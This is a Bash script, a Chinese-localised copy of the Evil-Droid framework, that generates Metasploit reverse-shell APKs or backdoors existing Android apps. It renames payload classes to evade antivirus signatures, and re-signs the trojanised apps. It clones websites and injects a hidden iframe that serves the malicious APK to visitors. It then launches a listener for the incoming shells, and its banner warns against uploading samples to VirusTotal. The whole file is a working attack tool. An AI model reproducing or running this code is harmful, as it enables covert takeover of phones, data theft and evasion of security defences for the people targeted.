#!/usr/bin/env bash
#
# Evil-Droid框架 版本 0.2
# Evil-Droid是一个用于创建、生成并嵌入APK payload以渗透Android平台的框架
# 
#                  原作者: Mascerano Bachir
#                 汉化作者: sethAion
#                 网站: http://www.dev-labs.co
#           YouTube: https://www.youtube.com/c/mascerano%20bachir  
#        Facebook: https://www.facebook.com/kali.linux.pentesting.tutorials
# 特别鸣谢: MrPedroubuntu, Kader Achraf 和 Mohammed Yacine
# 中国地区汉化维护者: @sethaion
#
# 这是一个开源工具，如果您想修改或添加内容，请给我一份副本。

# 调整终端窗口大小
resize -s 38 70 > /dev/null

# 定义颜色
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";

# 检查root权限
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo $red "您必须是root用户才能运行此脚本"; echo; exit 1; }
clear

# 检查互联网连接
function checkinternet() 
{
  ping -c 1 baidu.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow "检查互联网连接: ${RedF}失败"
    echo
    echo -e $red "此脚本需要活跃的互联网连接"
    echo
    echo -e $yellow "Evil-Droid 退出"
    echo && sleep 2
    exit
  else
    echo -e $yellow "检查互联网连接: ${LighGreenF}已连接"
  fi
}
checkinternet
sleep 2

# 定义选项
path=`pwd`
lanip=`ip route get 1 | awk '{print $NF;exit}'`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.2"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali目录重命名
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali目录重命名
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali重命名
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # 包名重命名1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # 包名重命名2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # 包名重命名3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # "payload" 的新名称
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # "metasploit" 的新名称
echo ""
sleep 1

# 用于Metasploit生成的加载动画
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}

# 检测Ctrl+C退出
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red "[*] 检测到 (Ctrl + C)，尝试退出..."
echo -e $red "[*] 正在停止服务..."
apache_svc_stop
postgresql_stop
sleep 1
echo ""
echo -e $yellow "[*] 感谢使用 Evil-Droid :)"
exit
}

# 检测系统
echo -e $blue
sudo cat /etc/issue.net

# 检查依赖配置
echo -e $blue "" 
echo "® 检查依赖配置 ®" 
echo "                                       " 

# 检查是否安装metasploit-framework
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ 已找到 ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}未找到 "
echo -e $yellow "[ ! ] 正在安装 Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] 安装完成 ...."
which msfconsole > /dev/null 2>&1
sleep 2
fi

# 检查是否安装xterm
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ 已找到 ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Xterm -> ${RedF}未找到! "
sleep 2
echo -e $yellow "[ ! ] 正在安装 Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] 安装完成 .... "
which xterm > /dev/null 2>&1
fi

# 检查是否安装zenity
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ 已找到 ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zenity -> ${RedF}未找到! "
sleep 2
echo -e $yellow "[ ! ] 正在安装 Zenity "
sleep 2
echo -e $green ""
sudo apt-get install zenity -y
clear
echo -e $blue "[ ✔ ] 安装完成 .... "
which zenity > /dev/null 2>&1
fi

# 检查Android Asset Packaging Tool
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ 已找到 ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Aapt -> ${RedF}未找到! "
sleep 2
echo -e $yellow "[ ! ] 正在安装 Aapt "
sleep 2
echo -e $green ""
sudo apt-get install aapt -y
sudo apt-get install android-framework-res -y
clear
echo -e $blue "[ ✔ ] 安装完成 .... "
which aapt > /dev/null 2>&1
fi

# 检查Apktool逆向工程工具
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ 已找到 ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Apktool -> ${RedF}未找到! "
sleep 2
echo -e $yellow "[ ! ] 正在安装 Apktool "
sleep 2
echo -e $green ""
sudo apt-get install apktool -y
clear
echo -e $blue "[ ✔ ] 安装完成 .... "
which apktool > /dev/null 2>&1
fi

# 检查zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ 已找到 ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zipalign -> ${RedF}未找到! "
sleep 2
echo -e $yellow "[ ! ] 正在安装 Zipalign "
sleep 2
echo -e $green ""
sudo apt-get install zipalign -y
clear
echo -e $blue "[ ✔ ] 安装完成 .... "
which zipalign > /dev/null 2>&1
fi

directory="$path/evilapk"
if [ ! -d "$directory" ]; then
    echo "正在创建输出目录..."
    mkdir $directory
    sleep 3
fi

echo -e $red "╔────────────────────────────────────────────────╗"
echo -e $red "|    Evil-Droid框架 $ver - Dev-labs.co         |"
echo -e $red "|    请勿将APK上传到VirusTotal.com            |"
echo -e $red "┖────────────────────────────────────────────────┙"

# ASCII艺术banner（保持不变）
function print_ascii_art {
echo -e $lightgreen "             .           .           "          
echo -e $lightgreen "             M.          .M          "     
echo -e $lightgreen "              MMMMMMMMMMM.           "     
echo -e $lightgreen "           .MMM\MMMMMMM/MMM.         "     
echo -e $lightgreen "          .MMM.7MMMMMMM.7MMM.        "     
echo -e $lightgreen "         .MMMMMMMMMMMMMMMMMMM        "     
echo -e $lightgreen "         MMMMMMM.......MMMMMMM       "     
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "     
echo -e $lightgreen "    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $lightgreen "    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $lightgreen "             MMMMM   MMMMM  $ver     "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             MMMMM   MMMMM           "   
echo -e $lightgreen "             .MMM.   .MMM.           " 
echo -e $lightgreen "     Mascerano Bachir - Dev-labs     "                                 
}

# 设置LHOST
function get_lhost() 
{
  LHOST=$(zenity --title="☢ 设置 LHOST ☢" --text "您的本地IP: $lanip ; 您的公网IP: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
}

# 设置LPORT
function get_lport() 
{
  LPORT=$(zenity --title="☢ 设置 LPORT ☢" --text "例如: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
}

# 选择payload
function get_payload()
{
  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\n选择payload选项:" --radiolist --column "选择" --column "选项" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
}

function get_payload1()
{
  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\n选择payload选项:" --radiolist --column "选择" --column "选项" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
}

# 设置payload名称
function payload_name()
{
 apk_name=$(zenity --title "☢ PAYLOAD名称 ☢" --text "例如: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
}

# 选择原始APK
function orig_apk()
{
 orig=$(zenity --title "☢ 原始APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "选择原始APK" 2> /dev/null) 
}

# 生成APK payload
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] 正在生成APK payload"
 spinlong
 xterm -T "生成APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}

# 嵌入payload到原始APK
function embed_payload()
{
 echo -e $yellow ""
 echo "[*] 正在将APK payload嵌入原始APK"
 spinlong
 xterm -T "嵌入APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}

# 反编译APK
function apk_decomp()
{
 echo -e $yellow ""
 echo "[*] 正在反编译APK文件..."
 spinlong
 xterm -T "反编译APK" -e apktool d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}

# 重建APK
function apk_comp()
{
 echo -e $yellow ""
 echo "[*] 正在重建APK文件..."
 spinlong
 xterm -T "重建APK" -e apktool b $path/payload > /dev/null 2>&1
 mv payload/dist/$apk_name.apk $path > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
}

# 错误处理
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 重建后门APK失败【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}

function error0()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 发生错误，请重试【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}

# Apache2服务控制
function apache_svc_start()
{
 service apache2 start | zenity --progress --pulsate --title "请稍候..." --text="启动apache2服务" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}

function apache_svc_stop()
{
 service apache2 stop | zenity --progress --pulsate --title "请稍候..." --text="停止apache2服务" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}

# PostgreSQL服务控制
function postgresql_start()
{
 service postgresql start | zenity --progress --pulsate --title "请稍候..." --text="启动postgresql服务" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}

function postgresql_stop()
{
 service postgresql stop | zenity --progress --pulsate --title "请稍候..." --text="停止postgresql服务" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}

# 规避AV签名
function flagg()
{
 echo -e $yellow ""
 echo "[*] 正在清理payload内容以规避AV签名..."
 spinlong
 mv payload/smali/com/metasploit payload/smali/com/$VAR1
 mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
 mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sleep 2
 if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
    echo
    echo -e $red "[ X ] 发生错误，请升级您的系统版本.."
    apache_svc_stop
    postgresql_stop
    exit 1
 fi
 sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
 sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
 sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
 sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
 sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
}

# 签名APK
function sign()
{
 echo -e $yellow ""
 echo "[*] 正在检查 ~/.android/debug.keystore 以进行签名..."
 spinlong
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $red ""
     echo " [ X ] 未找到调试密钥，正在生成..."
     spinlong
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lightgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 spinlong
 echo -e $yellow ""
 echo "[*] 正在尝试使用您的Android调试密钥对包进行签名"
 spinlong
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $apk_name.apk androiddebugkey > /dev/null 2>&1
 echo -e $yellow 
 echo "[*] 正在验证已签名的工件..."
 spinlong
 jarsigner -verify -certs $apk_name.apk > /dev/null 2>&1
 rc=$?
 echo -e $yellow
 echo "[✔] 完成."
 spinlong
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] 验证已签名的工件失败"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}

# 选择APK类型
function quests()
{
while true; do
   echo ""
   quest=$(zenity --list --title "☢ EVIL-DROID选项 ☢" --text "选择payload APK或原始APK?" --radiolist --column "选择" --column "选项" TRUE "APK-MSF" FALSE "原始APK" --width 305 --height 270 2> /dev/null) 
   case $quest in
   APK-MSF) spinlong;gen_payload;spinlong;apk_decomp;flagg;spinlong;apk_comp;spinlong;sign;return;;
   原始APK) orig_apk;spinlong;embed_payload;return;;
   esac
done
}

# 启动监听器
function listener()
{
  xterm -T "EVIL-DROID 多重处理" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
}

# 克隆网站
function clns()
{
 clone=$(zenity --title "☢ 克隆网站 ☢" --text "粘贴要克隆的网站链接" --entry --width 400 2> /dev/null)
}

function index_name()
{
 index=$(zenity --title "☢ 索引名称 ☢" --text "例如: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
 echo -e $yellow ""
 echo "[*] 从URL克隆网站..."
 spinlong
 wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
}

function launcher()
{
 echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
 com=`cat apk_index`
 rep="</body></html>"
 sed "s|$rep|$com|" $index.html > index2.html
 mv index2.html /var/www/html/$index.html > /dev/null 2>&1
 cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
 rm apk_index > /dev/null 2>&1
 rm $index.html > /dev/null 2>&1
 zenity --title "☢ 网站已克隆 ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
}

# 攻击向量选项
function atkv()
{
while true; do
   echo ""
   atk_v=$(zenity --list --title "☢ EVIL-DROID选项 ☢" --text "选择以下选项:" --radiolist --column "选择" --column "选项" TRUE "多重处理" FALSE "攻击向量" FALSE "主菜单" FALSE "退出" --width 305 --height 270 2> /dev/null) 
   case $atk_v in
   多重处理) listener;suite;;
   攻击向量) clns;spinlong;index_name;launcher;listener;suite;;
   主菜单) clear;main;;
   退出) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " 再见 !!";echo "";exit;;
   esac
done
}

# 继续选项
function suite()
{
while true; do
   echo ""
   suit=$(zenity --list --title "☢ EVIL-DROID选项 ☢" --text "是否继续?" --radiolist --column "选择" --column "选项" TRUE "主菜单" FALSE "退出" --width 305 --height 270 2> /dev/null) 
   case $suit in
   主菜单) clear;main;;
   退出) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " 再见 !!";echo "";exit;;
   esac
done
}

# 清理文件
function clean()
{
 rm $directory/* > /dev/null 2>&1
 rm $path/*.jpeg > /dev/null 2>&1
 rm $path/*.txt > /dev/null 2>&1
 rm /var/www/html/*.apk > /dev/null 2>&1
 rm /var/www/html/$index.html > /dev/null 2>&1
}      

# 启动询问
start=$(zenity --question --title="☢ Evil-Droid框架 ☢" --text "执行框架和服务？" --width 270 2> /dev/null)
  if [ "$?" -eq "0" ]; then
    apache_svc_start
    postgresql_start
  else
    clear
    echo ""
    echo -e $lightgreen "╔──────────────────────────────────────────────╗"
    echo -e $lightgreen "|           作者: Mascerano Bachir             |"
    echo -e $lightgreen "|    Evil-Droid框架 $ver - Dev-labs.co       |"
    echo -e $lightgreen "|   鸣谢: MrPedroubuntu, Kader Achraf         |"
    echo -e $lightgreen "|         和 Mohammed Yacine                  |"
    echo -e $lightgreen "|   中国地区汉化维护者: @sethaion             |"
    echo -e $lightgreen "┖──────────────────────────────────────────────┙"
    echo ""
    apache_svc_stop
    postgresql_stop
    exit
  fi
clear

# 主菜单
function main()
{
    while :
    do
        print_ascii_art
        echo -e $green ""
        echo "╔──────────────────────────────────────────────╗"
        echo "|          Evil-Droid框架 $ver               |"
        echo "|      渗透测试Android平台                  |"
        echo "┖──────────────────────────────────────────────┙"
        echo "[1] APK MSF                                     "
        echo "[2] 后门原始APK                               "
        echo "[3] 绕过AV的APK                               "
        echo "[4] 启动监听器                                "
        echo "[c] 清理                                       "
        echo "[q] 退出                                       "
        read -p "[?] 选择>: " option
        echo
        
        case "$option" in 
            1)  echo -e $lightgreen "[✔] APK MSF"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                spinlong
                gen_payload
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error0
                sleep 2
                echo ""
                zenity --title "☢ EVIL-DROID ☢" --info --text "APK PAYLOAD: $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv
                echo
                ;;
            2)  echo -e $lightgreen "[✔] 后门原始APK"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload
                echo
                orig_apk
                echo
                spinlong
                embed_payload
                echo 
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error
                sleep 2
                echo ""
                zenity --title "☢ EVIL-DROID ☢" --info --text "后门APK: $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            3)  echo -e $lightgreen "[✔] 绕过AV的APK"
                echo -e $green
                get_lhost
                get_lport
                echo
                payload_name
                get_payload1
                echo
                quests
                mv $apk_name.apk $path/evilapk > /dev/null 2>&1
                error
                sleep 2
                echo 
                zenity --title "☢ EVIL-DROID ☢" --info --text "已签名APK: $path/evilapk/$apk_name.apk " --width 400 > /dev/null 2>&1
                atkv 
                echo
                ;;
            4)  echo -e $lightgreen "[✔] 启动监听器"
                echo -e $green
                get_lhost
                get_lport
                echo
                get_payload
                echo
                listener
                suite 
                echo
                ;;
            c)  echo -e $lightgreen "[✔] 清理所有文件"
                echo
                clean
                echo
                zenity --title "☢ EVIL-DROID ☢" --info --text "所有文件已移除 " --width 400 > /dev/null 2>&1
                echo
                clear
                ;;
            q)  echo -e $yellow " 再见 !!"
                apache_svc_stop
                postgresql_stop
                echo
                exit 0 
                ;;
            *)  echo -e $red  "【X】 无效选项，请输入有效数字【X】"
                echo
                sleep 2
                ;;
        esac
    done
}
main